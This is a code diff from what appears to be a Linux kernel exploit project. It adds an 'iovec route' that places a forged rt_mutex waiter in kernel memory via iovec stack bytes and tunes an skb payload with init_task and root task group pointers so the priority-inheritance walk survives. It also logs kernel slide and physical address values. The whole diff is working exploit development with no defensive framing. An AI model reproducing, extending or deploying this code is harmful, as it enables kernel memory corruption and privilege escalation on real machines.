@@ -43,13 +43,46 @@ void clear_pselect_write(void) {
   pselect_custom_target = 0;
 }
 
-int tcp_route_selected(void) {
-  /* compact defaults to tcp; GHOSTLOCK_TCP_ROUTE=0 selects pselect */
+static int fdset_route_forced(void) {
+  /* GHOSTLOCK_TCP_ROUTE=0 falls back to the fd_set route on any kernel */
   const char *s = getenv("GHOSTLOCK_TCP_ROUTE");
-  if (s && *s && strcmp(s, "0") == 0) {
+  return s && *s && strcmp(s, "0") == 0;
+}
+
+int tcp_route_selected(void) {
+  if (fdset_route_forced()) {
     return 0;
   }
-  return active_offsets && active_offsets->compact_waiter;
+  return active_offsets && (active_offsets->compact_waiter ||
+                            active_offsets->waiter_route == WAITER_ROUTE_TCP);
+}
+
+int iov_route_selected(void) {
+  if (fdset_route_forced()) {
+    return 0;
+  }
+  return active_offsets && !active_offsets->compact_waiter &&
+         active_offsets->waiter_route == WAITER_ROUTE_IOV;
+}
+
+/* iovstack byte that carries waiter+off, or -1 when the field falls outside
+ * the eight fast iovecs. */
+int iov_waiter_byte(int off) {
+  if (!active_offsets) {
+    return -1;
+  }
+  int byte = off - active_offsets->iov_waiter_off;
+  if (byte < 0 || (byte & 7) || byte + 8 > IOV_ROUTE_FASTIOV * 16) {
+    return -1;
+  }
+  return byte;
+}
+
+/* copy_iovec_from_user() rejects a negative iov_len, so a field landing on a
+ * length slot cannot carry a kernel pointer. */
+int iov_route_delivers_task(void) {
+  int byte = iov_waiter_byte(FAKE_WAITER_TASK_OFF);
+  return byte >= 0 && (byte & 15) == 0;
 }
 
 void setup_kernelsnitch(void) {
@@ -135,8 +168,17 @@ void log_startup_context(void) {
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
-             getpid(), BUILD_VARIANT_LABEL);
+  const char *route = tcp_route_selected()   ? "tcp"
+                      : iov_route_selected() ? "iovec"
+                                             : "pselect";
+  pr_success("build config pid=%d label=%s slide=pselect main=%s\n",
+             getpid(), BUILD_VARIANT_LABEL, route);
+  if (iov_route_selected()) {
+    pr_info("iovec route iov_waiter_off=%d lock@iovstack+0x%x task=%s\n",
+            active_offsets->iov_waiter_off,
+            iov_waiter_byte(FAKE_WAITER_LOCK_OFF),
+            iov_route_delivers_task() ? "delivered" : "null (pi_top_task=0)");
+  }
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
@@ -360,6 +402,13 @@ int prepare_skb_payload(uintptr_t base) {
   uint64_t waiter_task = INIT_TASK;
   uint64_t task_group = ROOT_TASK_GROUP;
   uint64_t pi_top_task = INIT_TASK;
+
+  /* The iovec route cannot put a kernel pointer in the stale waiter's task
+   * slot, so the PI walk hands rt_mutex_setprio() a NULL pi_task; matching
+   * pi_top_task keeps it on the "nothing changed" early return. */
+  if (iov_route_selected() && !iov_route_delivers_task()) {
+    pi_top_task = 0;
+  }
 
   int compact = active_offsets && active_offsets->compact_waiter;
 
